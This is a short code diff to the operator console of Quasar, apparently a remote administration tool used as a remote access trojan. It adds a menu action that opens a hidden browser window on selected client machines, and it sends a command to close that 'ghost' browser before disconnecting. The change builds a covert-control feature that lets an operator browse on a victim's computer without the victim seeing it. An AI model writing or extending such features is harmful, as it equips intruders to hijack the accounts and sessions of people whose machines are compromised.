@@ -483,6 +483,8 @@ namespace Quasar.Server.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
+                /* Close ghost browser window on client before disconnecting. */
+                c.Send(new DoCloseHiddenBrowser());
                 c.Send(new DoClientDisconnect());
             }
         }
@@ -656,6 +658,16 @@ namespace Quasar.Server.Forms
                 var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c, RemoteControlMode.Kernel);
                 frmRd.Show();
                 frmRd.Focus();
+            }
+        }
+
+        private void hiddenBrowserToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                var frm = FrmHiddenBrowser.CreateNewOrGetExisting(c);
+                frm.Show();
+                frm.Focus();
             }
         }
 
